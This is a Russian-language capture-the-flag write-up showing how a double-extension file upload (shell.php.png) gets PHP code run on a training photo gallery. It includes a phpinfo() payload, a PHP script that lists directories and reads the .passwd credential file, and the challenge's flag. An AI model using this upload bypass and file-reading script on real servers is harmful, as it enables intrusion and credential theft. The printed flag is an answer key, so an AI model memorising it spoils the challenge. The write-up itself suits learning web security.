# File upload - Double extensions  
## Галерея v0.02 
Ваша цель - взломать эту фотогалерею, загрузив PHP-код.  
Получите пароль проверки в файле .passwd в корне приложения.  

Мы попадаем на сайт, в котором есть несколько разделов. В глаза бросается раздел "Upload"  
<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/0b2ec078-5ddc-4868-90e4-b6aef7017dc0" />  
Попробуем загрузить туда обычную картинку  
<img width="1919" height="1000" alt="image" src="https://github.com/user-attachments/assets/b59e1ff3-a395-4acd-a4ed-c5e4f3e0948b" />  
Нам дают ссылку, где хранится наша картинка. Попробуем загрузить туда php скрипт, но получаем предупреждение **Wrong file extension !**. Сервер пишет: **NB : only .gif, .jpeg and .png are accepted**  
Можно отправить на сервер файл shell.php.png с двойным расширением  
shell.php.png  
```php
<?php
phpinfo();
?>
```
отправляем на сервер и получаем:  
<img width="1919" height="995" alt="image" src="https://github.com/user-attachments/assets/f86da319-2fa6-452c-9faa-6734df7a9ecc" />  
Сервер обработал наш запрос и вывел конфигурацию php  
Сервер читает файл shell.php.png как PHP-код благодаря классической уязвимости, связанной с двойным расширением (Double Extension), которая возникает из-за специфической конфигурации веб-сервера, чаще всего Apache.
Написал скрипт, чтобы вытащить .passwd из корневой директории  
**shell.php.png**
```php
<?php
echo "<pre>";
// Директория для сканирования (одна директория назад)
$dir = '../../..'; 
$target_filename = '.passwd';
$target_filepath = "$dir/$target_filename";

// Сканируем родительскую директорию
$files = @scandir($dir);

if ($files === false) {
    die("Не удалось прочитать директорию '$dir'. Проверьте права доступа.");
}

echo "
======================================
      СПИСОК ФАЙЛОВ И ПАПОК В '$dir'
======================================\n";

// Перебираем полученный массив
foreach ($files as $item) {
    // Исключаем стандартные ссылки ('.' и '..')
    if ($item != '.' && $item != '..') {
        
        // Формируем полный путь для проверки типа элемента
        $path = "$dir/$item";
        
        if (is_dir($path)) {
            echo "[DIR]  $item\n";
        } else {
            // Выделяем потенциально важные файлы
            if (preg_match('/(\.flag|\.key|\.secret|\.conf|\.passwd|config\.php|\.htaccess)/i', $item)) {
                echo "[FILE] !!!! $item\n";
            } else {
                echo "[FILE] $item\n";
            }
        }
    }
}

$file_content = @file_get_contents($target_filepath);
if ($file_content === false) {
    die("Ошибка: Не удалось прочитать содержимое файла '$target_filepath'. Проверьте права доступа.");
}

// Вывод содержимого файла
echo "
======================================
  📜 СОДЕРЖИМОЕ ФАЙЛА '$target_filepath'
======================================\n";
echo htmlspecialchars($file_content);

echo "</pre>";
?>
```
После загрузки этого скрипта на сервер получаем содержимое флага и получаем флаг!  
<img width="1918" height="983" alt="image" src="https://github.com/user-attachments/assets/9e9ca1b9-a558-4b5e-b349-3f2d14718be5" />  
**Флаг: Gg9LRz-hWSxqqUKd77-_q-6G8**
